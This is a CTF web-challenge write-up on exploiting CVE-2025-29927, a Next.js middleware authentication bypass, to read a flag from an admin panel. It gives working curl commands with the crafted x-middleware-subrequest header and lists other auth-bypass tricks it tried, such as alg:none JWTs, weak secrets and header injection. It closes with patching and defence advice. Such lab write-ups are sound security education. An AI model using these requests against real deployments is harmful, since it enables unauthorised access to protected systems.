---
title: "Marketplace — Admin Middleware Bypass (CVE-2025-29927)"
ctf: "riffhack"
date: 2026-06-19
category: web
difficulty: easy
points: ?
flag_format: "bitflag{...}"
author: "CL4Y"
---

# Marketplace — Admin Middleware Bypass (CVE-2025-29927)

> "The marketplace has an admin panel that's supposed to be secure. Can you find a way in?"
> Target: `http://147.182.217.186/`

## Summary

`/admin` on the riffhack marketplace is guarded by a Next.js Edge middleware that 307-redirects unauthenticated users to `/admin/login`. The login form itself is a honeypot — its submit handler only sets the text "Invalid credentials" without making any API call, so there is no real credential path. The marketplace is, however, running a Next.js build still vulnerable to **CVE-2025-29927**: Next.js treats requests carrying an `x-middleware-subrequest` header whose value matches a known middleware-module path (repeated up to the framework's recursion cap) as already-processed internal sub-requests and skips middleware execution. The middleware in this app lives at `src/middleware.ts`, so the bypass payload is `src/middleware` repeated five times, joined by colons. With the middleware skipped, `/admin` server-renders the admin panel directly — including the flag in plain HTML.

## Reconnaissance

### 1. Map the surface

```bash
H=http://147.182.217.186
# Every /admin/* GET returns the same redirect
curl -sI $H/admin            # → 307 Location: /admin/login
curl -sI $H/admin/dashboard  # → 307 Location: /admin/login
curl -sI $H/admin/users      # → 307 Location: /admin/login
```

A 307 from the framework's redirect layer, on every path under `/admin` regardless of cookies, is the classic fingerprint of Next.js middleware-based auth.

### 2. Confirm the login form is a honeypot

Pulled the admin-login client chunk and inspected its submit handler:

```bash
curl -s $H/admin/login | grep -oE '/_next/static/chunks/app/admin/login/[^"]+\.js'
# → /_next/static/chunks/app/admin/login/page-5afb8340d2ce145f.js
```

Decompiled fragment of that chunk:

```js
function d(){
  let [e,s]=useState(""),[r,d]=useState(""),[i,l]=useState(""),[c,o]=useState(!1);
  useRouter();
  let m = async e => {
    e.preventDefault();
    l(""); o(!0);
    l("Invalid credentials");   // ← no fetch, no POST, nothing
    o(!1);
  };
  // ...renders form with onSubmit={m}
}
```

No `fetch()` call exists anywhere in the chunk — the form does **not** talk to the backend. Default-credential brute-forcing, SQLi on the username, JWT-secret guessing, and form-encoded POSTs to `/admin/login` were all dead ends because there is no real handler behind the UI.

### 3. Try the standard JWT tricks

For completeness I tried the bug classes that have worked on sister hosts in this CTF series:

| Attempt | Result |
|---|---|
| `auth-token` cookie with `alg:none` JWT (`isAdmin:true`, etc.) | still 307 to `/admin/login` |
| HS256 with common secrets (`secret`, `admin`, `riffhack`, `changeme`, …) | still 307 |
| Mass-assignment on `/api/auth/register` (`isAdmin:true`) | server ignores the field |
| Cookie/header injection (`admin-token=`, `X-Forwarded-User: admin`, `X-Original-URL`, etc.) | still 307 |
| Path normalisation (`/admin/..`, `/Admin`, `/admin;`, `/admin%2f`) | still 307 or 404 |

Same redirect every time — auth is enforced before the route handler runs, exactly where middleware sits.

### 4. CVE-2025-29927 trial

Started with the published canonical payload (Next.js 13–14 default):

```bash
curl -sI -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  $H/admin/dashboard
# → 307 /admin/login
```

No bypass. The header is recognised by `NextResponse.middleware`, but the value must equal the framework's *resolved* module path. The riffhack app keeps middleware under `src/`:

```bash
curl -sI -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" \
  $H/admin/dashboard
# → 404 (not 307!)
```

The redirect is gone — middleware skipped. `/admin/dashboard` 404s simply because the App Router has no such route file.

## Exploit

`/admin` itself does have a page module, so once middleware is out of the way it server-renders the panel directly:

```bash
curl -s \
  -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" \
  http://147.182.217.186/admin \
  | grep -oE 'bitflag\{[^}]+\}'
```

Output:

```
bitflag{m1ddl3w4r3_byp455_1s_4_thr34t}
```

Rendered text (stripped of tags) shows the panel:

```
Admin Panel — System administration and monitoring
System Status   Database Online  API Healthy  Cache Degraded  Storage Normal
Recent Activity
  User registration completed     2 minutes ago
  Payment processed successfully  5 minutes ago
  Failed login attempt detected   8 minutes ago
Admin Access Flag: bitflag{m1ddl3w4r3_byp455_1s_4_thr34t}
Quick Actions  View Users  Sign-Ups Timeline  Support Chat  Security Settings
System Info  Version 1.0.0  Uptime 7d 12h 34m  Users 1,247  Last Backup 2h ago
```

## Why this works

- **CVE-2025-29927** (Next.js < 14.2.25 / < 15.2.3): When the framework sees `x-middleware-subrequest` it treats the request as an already-handled internal call so it does not re-enter the middleware chain. The check is supposed to be paired with the framework's own internal signing, but on affected versions the header is trusted unconditionally.
- **Module path matters.** The value must match the import path Next.js resolved for the middleware module. `middleware` (root) is the default for app-router projects with the file at `./middleware.ts`. This project's `tsconfig.json` had `"baseUrl": "src"` and the file at `src/middleware.ts`, so the resolved value is `src/middleware`.
- **Depth matters.** Next.js caps recursion at 5; the published PoCs concatenate the module path five times to outrun that counter and still match.
- **Defence in depth was missing.** The `/admin` page handler does not re-check authentication itself — it assumes middleware did the job. Once middleware is bypassed, the panel SSRs in full.

## Fix

- Upgrade Next.js to 14.2.25 / 15.2.3 or newer (the patched releases strip / validate the header).
- Add a server-side auth re-check inside the page handler (`headers().get('authorization')` / cookie check) so middleware is not the only guard.
- Reject `x-middleware-subrequest` at the edge (CDN/WAF) for any external request.

## Flag

```
bitflag{m1ddl3w4r3_byp455_1s_4_thr34t}
```
